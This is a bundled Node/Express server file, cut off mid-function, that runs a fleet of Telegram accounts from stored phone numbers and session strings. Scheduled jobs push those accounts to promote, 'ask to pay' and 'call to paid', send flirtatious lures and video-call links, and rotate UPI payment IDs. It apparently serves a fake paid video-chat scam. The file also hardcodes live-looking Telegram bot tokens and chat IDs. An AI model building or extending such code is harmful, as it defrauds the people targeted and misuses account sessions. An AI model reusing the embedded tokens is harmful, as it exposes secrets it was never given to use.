/* harmony import */ var _nest_components_users_schemas_user_schema__WEBPACK_IMPORTED_MODULE_18__ = __webpack_require__(/*! ./nest/components/users/schemas/user.schema */ "./nest/components/users/schemas/user.schema.ts");
/* harmony import */ var _nest_components_users_schemas_user_schema__WEBPACK_IMPORTED_MODULE_18___default = /*#__PURE__*/__webpack_require__.n(_nest_components_users_schemas_user_schema__WEBPACK_IMPORTED_MODULE_18__);


dotenv__WEBPACK_IMPORTED_MODULE_0___default().config();




 // Assuming timeZone and timeZoneName are exported from node-schedule-tz

















const timeOptions = { timeZone: 'Asia/Kolkata', timeZoneName: 'short' };
process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});

process.on('uncaughtException', (reason, promise) => {
  console.error(promise, reason);
});

process.on('exit', async () => {
  await _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance().closeConnection();
  await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.disconnectAll)();
});

var cors = __webpack_require__(/*! cors */ "cors");
const app = express__WEBPACK_IMPORTED_MODULE_1___default()();
const port = process.env.PORT || 8000;
const userMap = new Map();

let ip;
let clients;
let upiIds;
const pings = {}

;(0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)('https://ipinfo.io/json')
  .then(result => {
    return result?.data;
  })
  .then((output) => {
    ip = output;
    console.log(ip)
  })
  .then(async () => {
    const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance()
    await db.connect();
    await db.setEnv();
    setTimeout(async () => {
      checkerclass.getinstance()
      await setUserMap();
    }, 100);
  })
  .catch(err => console.error(err))

let count = 0;
let botCount = 0
const ppplbot = (chatId, botToken) => {
  let token = botToken;
  if (!token) {
    if (botCount % 2 == 1) {
      token = `bot6624618034:AAHoM3GYaw3_uRadOWYzT7c2OEp6a7A61mY`
    } else {
      token = `bot6607225097:AAG6DJg9Ll5XVxy24Nr449LTZgRb5bgshUA`
    }
    botCount++;
  }
  return `https://api.telegram.org/${token}/sendMessage?chat_id=${chatId ? chatId : "-1001801844217"}`
}
const pingerbot = `https://api.telegram.org/bot5807856562:${process.env.apikey}/sendMessage?chat_id=-1001703065531`;

const apiResp = {
  INSTANCE_NOT_EXIST: "INSTANCE_NOT_EXIST",
  CLIENT_NOT_EXIST: "CLIENT_NOT_EXIST",
  CONNECTION_NOT_EXIST: "CONNECTION_NOT_EXIST",
  ALL_GOOD: "ALL_GOOD",
  DANGER: "DANGER",
  WAIT: "WAIT"
};

async function setUserMap() {
  userMap.clear();
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${ppplbot()}&text=UptimeRobot : Refreshed Map`);
  const users = await db.getAllUserClients();
  clients = users
  upiIds = await db.getAllUpis()
  users.forEach(user => {
    userMap.set(user.userName.toLowerCase(), { url: `${user.repl}/`, timeStamp: Date.now(), deployKey: user.deployKey, downTime: 0, lastPingTime: Date.now(), clientId: user.clientId })
    pings[user.userName.toLowerCase()] = Date.now();
  })
}

function getClientData(cid) {
  const clients = Array.from(userMap.values())
  return clients.find((value) => {
    return value.clientId == cid
  })
}

function getCurrentHourIST() {
  const now = new Date();
  const istOffset = 5.5 * 60 * 60 * 1000;
  const istTime = new Date(now.getTime() + istOffset);
  const istHour = istTime.getUTCHours();
  return istHour;
}
const connetionQueue = [];
try {
  node_schedule_tz__WEBPACK_IMPORTED_MODULE_3___default().scheduleJob('test', ' 0 * * * * ', 'Asia/Kolkata', async () => {
    console.log("Promoting.....");
    const hour = getCurrentHourIST();
    const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
    // await db.clearChannelStats();

    const userValues = Array.from(userMap.values());
    for (let i = 0; i < userValues.length; i++) {
      const value = userValues[i];
      await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.url}assureppl`);
      await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(3000);
      await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.url}promote`);
      await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(2000);
      if (hour && hour % 3 === 0) {
        await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.url}calltopaid`);
      }
    }

    await db.clearStats();
    // await db.calculateAvgStats();
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${process.env.uptimeChecker}/processusers/400/0`);
  })

  // schedule.scheduleJob('test1', ' 2 3,6,10,16,20,22 * * * ', 'Asia/Kolkata', async () => {
  //     const userValues = Array.from(userMap.values());
  // for (let i = 0; i < userValues.length; i++) {
  //   const value = userValues[i];
  //   })
  // })

  node_schedule_tz__WEBPACK_IMPORTED_MODULE_3___default().scheduleJob('test2', '*/10 * * * *', 'Asia/Kolkata', async () => {
    const userValues = Array.from(userMap.values());
    for (let i = 0; i < userValues.length; i++) {
      const value = userValues[i];
      await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.url}markasread`);
      await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(3000);
    }
  })

  node_schedule_tz__WEBPACK_IMPORTED_MODULE_3___default().scheduleJob('test3', ' 15 7,13,16,21,23 * * * ', 'Asia/Kolkata', async () => {
    const userValues = Array.from(userMap.values());
    for (let i = 0; i < userValues.length; i++) {
      const value = userValues[i];
      await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.url}asktopay`);
      await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(3000);
    }

  })

  node_schedule_tz__WEBPACK_IMPORTED_MODULE_3___default().scheduleJob('test3', ' 25 0 * * * ', 'Asia/Kolkata', async () => {
    const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
    for (const value of userMap.values()) {
      await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(1000);
      await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.url}resetunpaid`);
      // await fetchWithTimeout(`${value.url}resetunppl`);
      await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.url}getuserstats2`);

      setTimeout(async () => {
        await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.url}asktopay`);
      }, 300000);
      await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(1000)
    }
    const now = new Date();
    if (now.getUTCDate() % 5 === 1) {
      setTimeout(async () => {
        await db.resetAvailableMsgs();
        await db.updateBannedChannels();
        await db.updateDefaultReactions();
      }, 30000);
    }

    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${ppplbot()}&text=${encodeURIComponent(await getPromotionStatsPlain())}`);
    await db.resetPaidUsers();
    await db.updateActiveChannels();
    await db.clearStats2();
    await db.clearAllStats();
    await db.reinitPromoteStats();

    try {
      const resp = await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`https://mychatgpt-pg6w.onrender.com/getstats`, { timeout: 55000 });
      const resp2 = await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`https://mychatgpt-pg6w.onrender.com/clearstats`, { timeout: 55000 });
    } catch (error) {
      console.log("Some Error: ", (0,_utils__WEBPACK_IMPORTED_MODULE_7__.parseError)(error), error.code)
    }

  })
} catch (error) {
  console.log("Some Error: ", (0,_utils__WEBPACK_IMPORTED_MODULE_7__.parseError)(error), error.code);
}

async function assure() {
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.url}resptopaid?msg=Hey...Dont worry!! I will Call you pakka ok!!`);
    setTimeout(async () => {
      await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.url}markasread?all=true`);
    }, 20000)
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(3000)
  }
}

app.use(cors());
app.use(body_parser__WEBPACK_IMPORTED_MODULE_6___default().json());
app.get('/', async (req, res, next) => {
  checkerclass.getinstance()
  res.send('Hello World!');
  next();
}, async (req, res) => {

  //
});

app.get('/exitacc', async (req, res, next) => {
  checkerclass.getinstance()
  res.send('Hello World!');
  next();
}, async (req, res) => {
  //
});

app.get('/processUsers/:limit/:skip', async (req, res, next) => {
  res.send("ok")
  next();
}, async (req, res) => {
  const limit = req.params.limit ? req.params.limit : 30
  const skip = req.params.skip ? req.params.skip : 20
  const db = await _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const cursor = await db.processUsers(parseInt(limit), parseInt(skip));
  while (await cursor.hasNext()) {
    const document = await cursor.next();
    console.log("In processUsers")
    const cli = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.createClient)(document.mobile, document.session);
    const client = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.getClient)(document.mobile);
    if (cli) {
      console.log(document.mobile, " :  true");
      const lastActive = await client.getLastActiveTime();
      const date = new Date(lastActive * 1000).toISOString().split('T')[0];
      const me = await client.getMe()
      const selfMSgInfo = await client.getSelfMSgsInfo();
      let gender = cli.gender;
      if (!gender) {
        const data = await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`https://api.genderize.io/?name=${me.firstName}%20${me.lastName}`);
        gender = data?.data?.gender;
      }
      await db.updateUser(document, { ...selfMSgInfo, gender, firstName: me.firstName, lastName: me.lastName, username: me.username, msgs: cli.msgs, totalChats: cli.total, lastActive, date, tgId: me.id.toString(), lastUpdated: new Date().toISOString().split('T')[0] });
      await client?.disconnect(document.mobile);
      await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.deleteClient)()
    } else {
      console.log(document.mobile, " :  false");
      await db.deleteUser(document);
    }
  }
  console.log("finished")
});

app.get('/refreshMap', async (req, res) => {
  checkerclass.getinstance();
  await setUserMap();
  res.send('Hello World!');
});

app.get('/clearstats2', async (req, res) => {
  checkerclass.getinstance();
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  await db.clearStats2();
  res.send('Hello World!');
});

app.get('/updateBannedChannels', async (req, res) => {
  checkerclass.getinstance();
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  await db.updateBannedChannels();
  res.send('Hello World!');
});
app.get('/resetAvailableMsgs', async (req, res) => {
  checkerclass.getinstance();
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  await db.resetAvailableMsgs();
  res.send('Hello World!');
});

app.get('/exit', async (req, res) => {
  await _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance().closeConnection();
  process.exit(1)
  res.send('Hello World!');
});

app.post('/channels', async (req, res, next) => {
  res.send('Hello World!');
  // console.log(req.body);
  next();
}, async (req, res) => {
  const channels = req.body?.channels;
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  channels?.forEach(async (channel) => {
    await db.insertChannel(channel);
  })
});

app.post('/contacts', async (req, res, next) => {
  res.send('Hello World!');
  // console.log(req.body);
  next();
}, async (req, res) => {
  const contacts = req.body?.contacts;
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  contacts?.forEach(async (contact) => {
    await db.insertContact(contact);
  })
  console.log('contacts saved', contacts.length);
});

app.get('/getip', (req, res) => {
  res.json(ip);
});

app.post('/users', async (req, res, next) => {
  res.send('Hello World!');
  console.log(req.body);
  next();
}, async (req, res) => {
  const user = req.body;
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  await db.insertUser(user);
  await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${ppplbot()}&text=ACCOUNT LOGIN: ${user.userName ? user.userName : user.firstName}:${user.msgs}:${user.totalChats}\n ${process.env.uptimeChecker}/connectclient/${user.mobile}`)
});

app.get('/channels/:limit/:skip', async (req, res, next) => {
  const limit = req.params.limit ? req.params.limit : 30
  const skip = req.params.skip ? req.params.skip : 20
  const k = req.query?.k
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const channels = await db.getChannels(parseInt(limit), parseInt(skip), k);
  let resp = 'joinchannel:'
  for (const channel of channels) {
    resp = resp + (channel?.username?.startsWith("@") ? channel.username : `@${channel.username}`) + "|";
  }
  res.send(resp);
});

app.get('/activechannels/:limit/:skip', async (req, res, next) => {
  const limit = req.params.limit ? req.params.limit : 30
  const skip = req.params.skip ? req.params.skip : 20
  const k = req.query?.k
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const result = await db.getActiveChannels(parseInt(limit), parseInt(skip), [k], [], 'channels');
  let resp = 'joinchannel:'
  for (const channel of result) {

    resp = resp + (channel?.username?.startsWith("@") ? channel.username : `@${channel.username}`) + "|";
  }
  res.send(resp);
});

let refresTime = Date.now();
app.get('/getdata', async (req, res, next) => {
  checkerclass.getinstance()
  if (Date.now() > refresTime) {
    refresTime = Date.now() + (5 * 60 * 1000);
  }
  res.setHeader('Content-Type', 'text/html');
  let resp = '<html><head></head><body>';
  resp = resp + await getData();
  resp += '</body></html>';
  resp += `<script>
              console.log("hii");
              setInterval(() => {
                window.location.reload();
              }, 20000);
          </script>`;
  res.send(resp);
});

app.get('/getdata2', async (req, res, next) => {
  checkerclass.getinstance()
  res.send('Hello World!');
  next();
}, async (req, res) => {
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.url}getDemostat2`);
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(1000);
  }
});

app.get('/getAllIps', async (req, res, next) => {
  checkerclass.getinstance()
  res.send('Hello World!');
  next();
}, async (req, res) => {
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    try {
      console.log(value.clientId)
      const res = await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.url}getip`);
      console.log(res.data);
    } catch (error) {

    }
  }
});

app.get('/refreshupis', async (req, res, next) => {
  checkerclass.getinstance()
  res.send('Hello World!');
  next();
}, async (req, res) => {
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.url}refreshupis`);
  }
});


app.get('/getviddata', async (req, res, next) => {
  checkerclass.getinstance()
  const chatId = req.query.chatId;
  let profile = req.query.profile;
  if (!profile && req.query.clientId) {
    profile = req.query.clientId?.replace(/\d/g, '')
  }
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const data = await db.getuserdata({ chatId, profile });
  res.json(data);
});

app.post('/getviddata', async (req, res, next) => {
  checkerclass.getinstance()
  let profile = req.query.profile;
  if (!profile && req.query.clientId) {
    profile = req.query.clientId?.replace(/\d/g, '')
  }
  const body = req.body;
  const chatId = body.chatId;
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const data = await db.updateUserData({ chatId, profile }, body);
  res.json(data);
});

app.get('/blockUser/:profile/:chatId', async (req, res, next) => {
  checkerclass.getinstance()
  let profile = req.params.profile;
  const chatId = req.params.chatId;
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const data = await db.updateUserData({ chatId, profile }, { canReply: 0, payAmount: 0 });
  res.json(data);
});

app.get('/sendvclink', async (req, res, next) => {
  checkerclass.getinstance()
  const chatId = req.query.chatId;
  const video = req.query.video;
  const profile = req.query.clientId;
  const client = getClientData(profile);
  const url = `${client?.url}sendvclink/${chatId}?${video ? `video=${video}` : ""}`;
  console.log(url);
  await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(url);
  res.send("done");
});

app.get('/sendvclink/:clientId/:chatId', async (req, res, next) => {
  checkerclass.getinstance()
  const clientId = req.params.clientId;
  const chatId = req.params.chatId;
  const video = req.query.video;
  const client = getClientData(clientId);
  const url = `${client?.url}sendvclink/${chatId}?${video ? `video=${video}` : ""}`;
  console.log(url);
  await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(url);
  res.send("done");
});

app.get('/blockUserall/:chatId', async (req, res, next) => {
  checkerclass.getinstance()
  const chatId = req.params.chatId;
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const data = await db.updateUserData({ chatId }, { canReply: 0, payAmount: 0 });
  res.json(data);
});

app.get('/getuserdata', async (req, res, next) => {
  checkerclass.getinstance()
  res.send('Hello World!');
  next();
}, async (req, res) => {
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.url}getuserstats`);
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(1000);
  }
});

app.get('/getuserdata2', async (req, res, next) => {
  checkerclass.getinstance()
  res.send('Hello World!');
  next();
}, async (req, res) => {
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.url}getuserstats2`);
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(1000);
  }
});

app.get('/restartall', async (req, res, next) => {
  checkerclass.getinstance()
  res.send('Hello World!');
  next();
}, async (req, res) => {
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.deployKey}`);
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(1000)
  }
});
app.get('/sendtoall', async (req, res, next) => {
  checkerclass.getinstance();
  console.log('Received sendtoall request');
  res.send('Hello World!');
  next();
}, async (req, res) => {
  const queries = req.query
  let newQuery = '';
  Object.keys(req.query).map((key) => {
    newQuery += `/${queries[key]}`
  });
  console.log(newQuery);
  for (const value of userMap.values()) {
    const url = `${value.url.slice(0, -1)}${newQuery}`;
    console.log(url);
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(1000);
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(url);
  }
});

app.get('/usermap', async (req, res) => {
  checkerclass.getinstance()
  console.log('Received Usermap request');
  res.json({ values: Array.from(userMap.values()), keys: userMap.keys() });
});

app.get('/getbufferclients', async (req, res) => {
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const result = []
  const clients = await db.readBufferClients({});
  clients.forEach((cli) => {
    result.push(cli.mobile);
  })
  res.json(result);
});

app.get('/clients', async (req, res) => {
  checkerclass.getinstance();
  console.log('Received Client request');
  res.json(clients)
});

app.get('/keepready2', async (req, res, next) => {
  checkerclass.getinstance()
  console.log('Received keepready2 request');
  res.send(`Responding!!\nMsg = ${req.query.msg}`);
  next();
}, async (req, res) => {
  const msg = req.query.msg;
  console.log("Msg2 = ", msg);
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.url}resptopaid2?msg=${msg ? msg : "Oye..."}`);
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.url}getDemostats`);
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(1000)
  }
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  await db.clearStats()
});

app.get('/keepready', async (req, res, next) => {
  checkerclass.getinstance();
  console.log('Received Keepready request');
  const dnsMsg = encodeURIComponent(`Dont Speak Okay!!\n**I am in Bathroom**\n\nMute yourself!!\n\nI will show you Okay..!!`)
  const msg = req.query.msg.toLowerCase() == 'dns' ? dnsMsg : req.query.msg;
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.url}resptopaid?msg=${msg ? msg : "Oye..."}`);
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(1000)
  }
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  await db.clearStats();
  res.send(`Responding!!\=url:resptopaid?msg=${msg ? msg : "Oye..."}`);
});

app.get('/asktopay', async (req, res, next) => {
  checkerclass.getinstance();
  console.log('Received AsktoPay request');
  res.send(`Asking Pppl`);
  next();
}, async (req, res) => {
  const msg = req.query.msg;
  console.log("Msg = ", msg);
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.url}asktopay`)
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(1000)
  }
});

let callingTime = Date.now();
app.get('/calltopaid', async (req, res, next) => {
  checkerclass.getinstance()
  console.log('Received Call request');
  res.send(`Asking Pppl`);
  next();
}, async (req, res) => {
  const msg = req.query.msg;
  console.log("Msg = ", msg);
  if (Date.now() > callingTime) {
    callingTime = Date.now() + (10 * 60 * 1000)
    const userValues = Array.from(userMap.values());
    for (let i = 0; i < userValues.length; i++) {
      const value = userValues[i];
      await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.url}calltopaid`)
      await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(1000)
    }
  }
});


app.get('/markasread', async (req, res, next) => {
  checkerclass.getinstance();
  console.log('Received MarkasRead Req');
  res.send('Hello World!');
  next();
}, async (req, res) => {
  const all = req.query.all;
  if (Date.now() > refresTime) {
    refresTime = Date.now() + (5 * 60 * 1000);
    console.log("proceeding with all = ", all);
    const userValues = Array.from(userMap.values());
    for (let i = 0; i < userValues.length; i++) {
      const value = userValues[i];
      await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.url}markasread?${all ? "all=true" : ''}`);
      await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(3000)
    }
  }
});

app.get('/setactiveqr', async (req, res, next) => {
  checkerclass.getinstance()
  res.send('Hello World!');
  next();
}, async (req, res) => {
  const upi = req.query.upi;
  console.log("upi = ", upi);
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.url}setactiveqr?upi=${upi}`);
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(1000)
  }
});

app.get('/joinchannel', async (req, res, next) => {
  res.send('Hello World!');
  next();
}, async (req, res) => {
  try {
    const userName = req.query.userName;
    if (userName) {
      const data = userMap.get(userName.toLowerCase());
      if (data) {
        joinchannels(data)
      } else {
        console.log(new Date(Date.now()).toLocaleString('en-IN', timeOptions), `User ${userName} Not exist`);
      }
    } else {
      const userValues = Array.from(userMap.values());
      for (let i = 0; i < userValues.length; i++) {
        const value = userValues[i];
        try {
          joinchannels(value);
          await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(3000);
        } catch (error) {
          console.log("Some Error: ", (0,_utils__WEBPACK_IMPORTED_MODULE_7__.parseError)(error), error.code);
        }
        await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(1000)
      }
    }
  } catch (error) {
    console.log("Some Error: ", (0,_utils__WEBPACK_IMPORTED_MODULE_7__.parseError)(error), error);
  }
});


app.get('/getUpiId', async (req, res) => {
  checkerclass.getinstance();
  const app = req.query.app ? req.query.app : "paytm3"
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const upiId = await db.getupi(app);
  res.send(upiId);
});

app.get('/getAllUpiIds', async (req, res) => {
  checkerclass.getinstance();
  res.json(upiIds);
});

app.post('/getAllUpiIds', async (req, res, next) => {
  const data = req.body
  checkerclass.getinstance();
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const upiIds = await db.updateUpis(data);
  res.json(upiIds);
  next();
}, async () => {
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.url}refreshupis`);
  }
})

app.get('/getUserConfig', async (req, res) => {
  const filter = req.query
  checkerclass.getinstance();
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const userConfig = await db.getUserConfig(filter);
  res.json(userConfig);
});

app.get('/getUserInfo', async (req, res) => {
  const filter = req.query
  checkerclass.getinstance();
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const userConfig = await db.getUserInfo(filter);
  res.json(userConfig);
});

app.post('/updateUserData/:chatId ', async (req, res) => {
  const data = req.body
  const chatId = req.params.chatId
  const profile = req.query.profile;
  checkerclass.getinstance();
  const filter = { chatId }
  if (profile) {
    filter['profile'] = profile
  }
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const userConfig = await db.updateUserData(filter, data);
  res.json(userConfig);
});

app.post('/getUserConfig', async (req, res) => {
  const filter = req.query
  const data = req.body
  checkerclass.getinstance();
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const upiIds = await db.updateUserConfig(filter, data);
  await setUserMap();
  res.json(upiIds);
});

app.get('/builds', async (req, res) => {
  checkerclass.getinstance();
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const data = await db.getBuilds();
  console.log(data);
  res.json(data);
});

app.post('/builds', async (req, res) => {
  const data = req.body
  checkerclass.getinstance();
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  console.log(data);
  const result = await db.updateBuilds(data);
  res.json(result);
});

app.get('/getAllUserClients', async (req, res) => {
  checkerclass.getinstance();
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const userConfig = await db.getAllUserClients();
  const resp = []
  userConfig.map((user) => {
    resp.push(user.clientId)
  })
  res.send(resp);
});

app.get('/getTgConfig', async (req, res) => {
  checkerclass.getinstance();
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const tgConfig = await db.getTgConfig()
  res.json(tgConfig);
});

app.get('/updateActiveChannels', async (req, res) => {
  checkerclass.getinstance();
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const tgConfig = await db.updateActiveChannels();
  res.send("ok");
});

app.get('/getCurrentActiveUniqueChannels', async (req, res) => {
  checkerclass.getinstance();
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const result = await db.getCurrentActiveUniqueChannels();
  res.json({ length: result.length, data: result });
});

app.post('/getTgConfig', async (req, res, next) => {
  const data = req.body
  checkerclass.getinstance();
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const upiIds = await db.updateUpis(data)
  res.json(upiIds);
  next();
}, async () => {
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.url}refreshupis`);
  }
});

app.get('/lastpings', async (req, res, next) => {
  checkerclass.getinstance();
  let resp = '<html><head><style>pre { font-size: 18px; }</style></head><body><pre>';
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    resp = resp + `${value.clientId}  :  ${Number(((Date.now() - value.lastPingTime) / 60000).toFixed(2))}\n`
  }
  resp += '</pre></body></html>';
  res.setHeader('Content-Type', 'text/html');
  res.send(resp);
});

app.get('/lastpingsjson', async (req, res, next) => {
  checkerclass.getinstance();
  let resp = '<html><head><style>pre { font-size: 18px; }</style></head><body><pre>';
  for (const userdata in pings) {
    resp = resp + `${userdata}  :  ${Number(((Date.now() - pings[userdata]) / 60000).toFixed(2))}\n`
  }
  resp += '</pre></body></html>';
  res.setHeader('Content-Type', 'text/html');
  res.send(resp);
});

app.get('/exitglitches', async (req, res, next) => {
  res.send("ok")
  next();
}, async () => {
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    if (value.url.toLowerCase().includes('glitch'))
      await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.url}exit`);
  }
});

app.get('/exitprimary', async (req, res, next) => {
  res.send("ok")
  next();
}, async () => {
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    if (value.clientId.toLowerCase().includes('1')) {
      await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.url}exit`);
      await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(40000);
    }
  }
});

app.get('/exitsecondary', async (req, res, next) => {
  res.send("ok")
  next();
}, async () => {
  const userValues = Array.from(userMap.values());
